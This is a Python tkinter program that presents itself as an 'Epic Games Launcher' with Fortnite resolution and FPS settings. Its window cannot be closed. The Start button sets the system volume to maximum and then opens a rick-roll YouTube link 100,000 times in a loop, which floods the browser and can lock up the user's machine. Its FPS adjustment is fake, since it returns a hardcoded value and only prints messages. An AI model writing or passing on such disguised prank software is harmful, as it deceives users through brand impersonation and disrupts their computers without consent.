import tkinter as tk
from tkinter import ttk
from colorama import Fore
import webbrowser
import threading
import time
import subprocess
import os
import ctypes

TARGET_FPS = 144
RICK_ROLL_LINK = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

class EpicGamesLauncherApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Epic Games Launcher")
        self.master.geometry("800x600")
        self.master.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable the close button

        style = ttk.Style()
        style.configure("TButton", padding=6, relief="flat", background="#4CAF50", foreground="black")  # Set text color to black

        self.create_pages()
        self.create_hud()

    def create_pages(self):
        self.notebook = ttk.Notebook(self.master)
        self.page1 = tk.Frame(self.notebook, bg="#282c34")
        self.page2 = tk.Frame(self.notebook, bg="#282c34")

        self.notebook.add(self.page1, text="Launcher")
        self.notebook.add(self.page2, text="Settings")
        self.notebook.pack(expand=1, fill="both")

    def create_hud(self):
        self.label = tk.Label(self.page1, text=f"{Fore.CYAN}\n{'='*30} Loading Screen {'='*30}", font=("Arial", 16), bg="#282c34", fg="white")
        self.label.pack(pady=20)

        self.start_button = ttk.Button(self.page1, text="Start", command=self.start_launcher, style="TButton")
        self.start_button.pack(pady=10)

        self.adjust_fps_button = ttk.Button(self.page2, text="Adjust FPS", command=self.adjust_fps, style="TButton")
        self.adjust_fps_button.pack(pady=10)

        self.resolution_label = tk.Label(self.page2, text="Fortnite Resolution:", font=("Arial", 12), bg="#282c34", fg="white")
        self.resolution_label.pack(pady=10)

        self.width_label = tk.Label(self.page2, text="Width:", font=("Arial", 10), bg="#282c34", fg="white")
        self.width_label.pack(pady=5)
        self.width_entry = ttk.Entry(self.page2)
        self.width_entry.pack(pady=5)

        self.height_label = tk.Label(self.page2, text="Height:", font=("Arial", 10), bg="#282c34", fg="white")
        self.height_label.pack(pady=5)
        self.height_entry = ttk.Entry(self.page2)
        self.height_entry.pack(pady=5)

        self.fps_label = tk.Label(self.page2, text="Target FPS:", font=("Arial", 12), bg="#282c34", fg="white")
        self.fps_label.pack(pady=10)
        self.fps_slider = ttk.Scale(self.page2, from_=1, to=240, orient="horizontal", length=200)
        self.fps_slider.set(TARGET_FPS)
        self.fps_slider.pack(pady=10)

    def start_launcher(self):
        self.label.config(text=f"{Fore.CYAN}\n{'='*30} Loading Screen {'='*30}\n{Fore.MAGENTA}{' '*8} Made by QNB\n{Fore.MAGENTA}{' '*18} Press Start to Begin\n", font=("Arial", 16))
        threading.Thread(target=self.launcher_thread).start()

    def launcher_thread(self):
        self.loading_animation()
        self.open_launcher()

    def loading_animation(self):
        for _ in range(5):  # Reduce the number of dots for quicker loading
            self.label.config(text=self.label.cget("text") + ".", font=("Arial", 16))
            time.sleep(1)
            self.master.update()

    def open_launcher(self):
        # Set volume to 100%
        ctypes.windll.winmm.dll = ctypes.WinDLL('winmm.dll')
        ctypes.windll.winmm.dll.waveOutGetVolume.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint)]
        ctypes.windll.winmm.dll.waveOutSetVolume.argtypes = [ctypes.c_void_p, ctypes.c_uint]
        volume = ctypes.c_uint(0xFFFF)
        ctypes.windll.winmm.dll.waveOutSetVolume(0, volume)

        # Open the first video
        webbrowser.open(RICK_ROLL_LINK)
        time.sleep(2)  # Wait for a moment before opening the remaining videos
        self.open_remaining_rick_rolls()

    def open_remaining_rick_rolls(self):
        # Open the remaining videos
        for _ in range(100000):
            webbrowser.open(RICK_ROLL_LINK)

    def adjust_fps(self):
        threading.Thread(target=self.adjust_fps_thread).start()

    def adjust_fps_thread(self):
        while True:
            current_fps = self.get_current_fps()
            if current_fps < TARGET_FPS:
                print(f"Adjusting resources to maintain FPS above {TARGET_FPS}...")
            time.sleep(5)

    def get_current_fps(self):
        return 120


def run_gui():
    root = tk.Tk()
    app = EpicGamesLauncherApp(root)
    root.mainloop()

if __name__ == "__main__":
    run_gui()
